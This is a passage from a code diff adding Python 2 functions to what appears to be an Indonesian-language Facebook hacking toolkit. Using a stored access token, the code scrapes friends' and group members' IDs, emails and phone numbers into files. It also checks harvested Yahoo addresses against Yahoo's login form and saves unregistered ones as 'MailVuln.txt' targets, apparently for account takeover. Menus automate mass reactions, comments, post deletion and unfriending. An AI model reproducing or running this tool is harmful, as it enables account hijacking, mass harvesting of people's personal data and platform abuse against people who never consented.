+    go = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if go == '':
+        print "\x1b[1;91m[!] Can't empty"
+        yahoo_pilih()
+    elif go == '1':
+        yahoofriends()
+    elif go == '2':
+        yahoolist()
+    elif go == '0':
+        menu_hack()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak Ditemukan'
+        yahoo_pilih()
+
+
+def yahoofriends():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token Tidak Ada'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    mpsh = []
+    jml = 0
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+    kimak = json.loads(friends.text)
+    save = open('MailVuln.txt', 'w')
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    for w in kimak['data']:
+        jml += 1
+        mpsh.append(jml)
+        id = w['id']
+        nama = w['name']
+        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
+        z = json.loads(links.text)
+        try:
+            mail = z['email']
+            yahoo = re.compile('@.*')
+            otw = yahoo.search(mail).group()
+            if 'yahoo.com' in otw:
+                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+                br._factory.is_html = True
+                br.select_form(nr=0)
+                br['username'] = mail
+                klik = br.submit().read()
+                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+                try:
+                    pek = jok.search(klik).group()
+                except:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
+                    continue
+
+                if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                    save.write(mail + '\n')
+                    print 52 * '\x1b[1;97m\xe2\x95\x90'
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + nama
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
+                    print 52 * '\x1b[1;97m\xe2\x95\x90'
+                else:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
+        except KeyError:
+            pass
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    print '\x1b[1;91m[+] \x1b[1;97mSimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    save.close()
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    menu_yahoo()
+
+
+def yahoolist():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
+        try:
+            total = open(files, 'r')
+            mail = total.readlines()
+        except IOError:
+            print '\x1b[1;91m[!] File not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_yahoo()
+
+    mpsh = []
+    jml = 0
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+    save = open('MailVuln.txt', 'w')
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
+    print
+    mail = open(files, 'r').readlines()
+    for pw in mail:
+        mail = pw.replace('\n', '')
+        jml += 1
+        mpsh.append(jml)
+        yahoo = re.compile('@.*')
+        otw = yahoo.search(mail).group()
+        if 'yahoo.com' in otw:
+            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+            br._factory.is_html = True
+            br.select_form(nr=0)
+            br['username'] = mail
+            klik = br.submit().read()
+            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+            try:
+                pek = jok.search(klik).group()
+            except:
+                print '\x1b[1;91m ' + mail
+                continue
+
+            if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                save.write(mail + '\n')
+                print '\x1b[1;92m ' + mail
+            else:
+                print '\x1b[1;91m ' + mail
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
+    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    save.close()
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    menu_yahoo()
+
+
+def grab():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. Get ID From Friends'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. Get Friends ID From Friends'
+    print '\xe2\x95\x91-> \x1b[1;37;40m3. Get ID From GRUP'
+    print '\xe2\x95\x91-> \x1b[1;37;40m4. Get Friends Email'
+    print '\xe2\x95\x91-> \x1b[1;37;40m5. Get Friends Email From Friends'
+    print '\xe2\x95\x91-> \x1b[1;37;40m6. Get Phone From Friends'
+    print "\xe2\x95\x91-> \x1b[1;37;40m7. Get Friend's Phone From Friends"
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Back'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    grab_pilih()
+
+
+def grab_pilih():
+    cuih = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if cuih == '':
+        print "\x1b[1;91m[!] Can't empty"
+        grab_pilih()
+    elif cuih == '1':
+        id_friends()
+    elif cuih == '2':
+        idfrom_friends()
+    elif cuih == '3':
+        id_member_grup()
+    elif cuih == '4':
+        email()
+    elif cuih == '5':
+        emailfrom_friends()
+    elif cuih == '6':
+        nomor_hp()
+    elif cuih == '7':
+        hpfrom_friends()
+    elif cuih == '0':
+        menu_hack()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + cuih + ' \x1b[1;91mnot found'
+        grab_pilih()
+
+
+def id_friends():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            z = json.loads(r.text)
+            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            bz = open(save_id, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for ah in z['data']:
+                idfriends.append(ah['id'])
+                bz.write(ah['id'] + '\n')
+                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
+                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
+                print 52 * '\x1b[1;97m\xe2\x95\x90'
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfriends)
+            print '\x1b[1;91m[+] \x1b[1;97mFile Disimpan \x1b[1;91m: \x1b[1;97m' + save_id
+            bz.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Error when creating file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except KeyError:
+            os.remove(save_id)
+            print '\x1b[1;91m[!] An error occurred'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            keluar()
+
+
+def idfrom_friends():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
+            try:
+                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                op = json.loads(jok.text)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
+            except KeyError:
+                print '\x1b[1;91m[!] Not be friends'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                grab()
+
+            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
+            z = json.loads(r.text)
+            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            bz = open(save_idt, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for ah in z['friends']['data']:
+                idfromfriends.append(ah['id'])
+                bz.write(ah['id'] + '\n')
+                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
+                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
+                print 52 * '\x1b[1;97m\xe2\x95\x90'
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfromfriends)
+            print '\x1b[1;91m[+] \x1b[1;97mFile Disimpan \x1b[1;91m: \x1b[1;97m' + save_idt
+            bz.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Error when creating file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            keluar()
+
+
+def id_member_grup():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
+            try:
+                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
+                asw = json.loads(r.text)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
+            except KeyError:
+                print '\x1b[1;91m[!] Group not found'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                grab()
+
+            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            b = open(simg, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
+            s = json.loads(re.text)
+            for i in s['data']:
+                idmem.append(i['id'])
+                b.write(i['id'] + '\n')
+                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
+                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
+                print 52 * '\x1b[1;97m\xe2\x95\x90'
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
+            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
+            b.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Error when creating file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except KeyError:
+            os.remove(simg)
+            print '\x1b[1;91m[!] Group not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            keluar()
+
+
+def email():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            a = json.loads(r.text)
+            mpsh = open(mails, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for i in a['data']:
+                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
+                z = json.loads(x.text)
+                try:
+                    em.append(z['email'])
+                    mpsh.write(z['email'] + '\n')
+                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
+                    print 52 * '\x1b[1;97m\xe2\x95\x90'
+                except KeyError:
+                    pass
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(em)
+            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
+            mpsh.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Error when creating file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except KeyError:
+            os.remove(mails)
+            print '\x1b[1;91m[!] An error occurred'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            keluar()
+
+
+def emailfrom_friends():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
+            try:
+                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                op = json.loads(jok.text)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
+            except KeyError:
+                print '\x1b[1;91m[!] Not be friends'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                grab()
+
+            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+            a = json.loads(r.text)
+            mpsh = open(mails, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for i in a['data']:
+                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
+                z = json.loads(x.text)
+                try:
+                    emfromfriends.append(z['email'])
+                    mpsh.write(z['email'] + '\n')
+                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
+                    print 52 * '\x1b[1;97m\xe2\x95\x90'
+                except KeyError:
+                    pass
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
+            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
+            mpsh.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Error when creating file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            keluar()
+
+
+def nomor_hp():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
+            r = requests.get(url)
+            z = json.loads(r.text)
+            no = open(noms, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for n in z['data']:
+                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
+                z = json.loads(x.text)
+                try:
+                    hp.append(z['mobile_phone'])
+                    no.write(z['mobile_phone'] + '\n')
+                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
+                    print 52 * '\x1b[1;97m\xe2\x95\x90'
+                except KeyError:
+                    pass
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Phone\x1b[1;96m%s' % len(hp)
+            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
+            no.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Error when creating file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except KeyError:
+            os.remove(noms)
+            print '\x1b[1;91m[!] An error occurred '
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            keluar()
+
+
+def hpfrom_friends():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput Friends ID \x1b[1;91m: \x1b[1;97m')
+            try:
+                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                op = json.loads(jok.text)
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
+            except KeyError:
+                print '\x1b[1;91m[!] Not be friends'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                grab()
+
+            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
+            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+            a = json.loads(r.text)
+            no = open(noms, 'w')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for i in a['data']:
+                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
+                z = json.loads(x.text)
+                try:
+                    hpfromfriends.append(z['mobile_phone'])
+                    no.write(z['mobile_phone'] + '\n')
+                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
+                    print 52 * '\x1b[1;97m\xe2\x95\x90'
+                except KeyError:
+                    pass
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal number\x1b[1;96m%s' % len(hpfromfriends)
+            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
+            no.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except IOError:
+            print '\x1b[1;91m[!] Make file failed'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            grab()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            keluar()
+
+
+def menu_bot():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. Bot Reactions Target Post'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. Bot Reactions Group Post'
+    print '\xe2\x95\x91-> \x1b[1;37;40m3. Bot Comment Target Post'
+    print '\xe2\x95\x91-> \x1b[1;37;40m4. Bot Comment Group Post'
+    print '\xe2\x95\x91-> \x1b[1;37;40m5. Mass Delete Post'
+    print '\xe2\x95\x91-> \x1b[1;37;40m6. Accept Friend Requests'
+    print '\xe2\x95\x91-> \x1b[1;37;40m7. Unfriends'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Back'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    bot_pilih()
+
+
+def bot_pilih():
+    bots = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if bots == '':
+        print "\x1b[1;91m[!] Can't empty"
+        bot_pilih()
+    elif bots == '1':
+        menu_react()
+    elif bots == '2':
+        grup_react()
+    elif bots == '3':
+        bot_komen()
+    elif bots == '4':
+        grup_komen()
+    elif bots == '5':
+        deletepost()
+    elif bots == '6':
+        accept()
+    elif bots == '7':
+        unfriend()
+    elif bots == '0':
+        menu()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + bots + ' \x1b[1;91mnot found'
+        bot_pilih()
+
+
+def menu_react():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. \x1b[1;97mLike'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. \x1b[1;97mLove'
+    print '\xe2\x95\x91-> \x1b[1;37;40m3. \x1b[1;97mWow'
+    print '\xe2\x95\x91-> \x1b[1;37;40m4. \x1b[1;97mHaha'
+    print '\xe2\x95\x91-> \x1b[1;37;40m5. \x1b[1;97mSad'
+    print '\xe2\x95\x91-> \x1b[1;37;40m6. \x1b[1;97mAngry'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Back'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    react_pilih()
+
+
+def react_pilih():
+    global tipe
+    aksi = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if aksi == '':
+        print "\x1b[1;91m[!] Can't empty"
+        react_pilih()
+    elif aksi == '1':
+        tipe = 'LIKE'
+        react()
+    elif aksi == '2':
+        tipe = 'LOVE'
+        react()
+    elif aksi == '3':
+        tipe = 'WOW'
+        react()
+    elif aksi == '4':
+        tipe = 'HAHA'
+        react()
+    elif aksi == '5':
+        tipe = 'SAD'
+        react()
+    elif aksi == '6':
+        tipe = 'ANGRY'
+        react()
+    elif aksi == '0':
+        menu_bot()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mnot found'
+        react_pilih()
+
+
+def react():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
+        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+        try:
+            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
+            ah = json.loads(oh.text)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            for a in ah['feed']['data']:
+                y = a['id']
+                reaksi.append(y)
+                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
+                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe
+
+            print
+            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(reaksi))
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+        except KeyError:
+            print '\x1b[1;91m[!] ID not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_bot()
+
+
+def grup_react():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. \x1b[1;97mLike'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. \x1b[1;97mLove'
+    print '\xe2\x95\x91-> \x1b[1;37;40m3. \x1b[1;97mWow'
+    print '\xe2\x95\x91-> \x1b[1;37;40m4. \x1b[1;97mHaha'
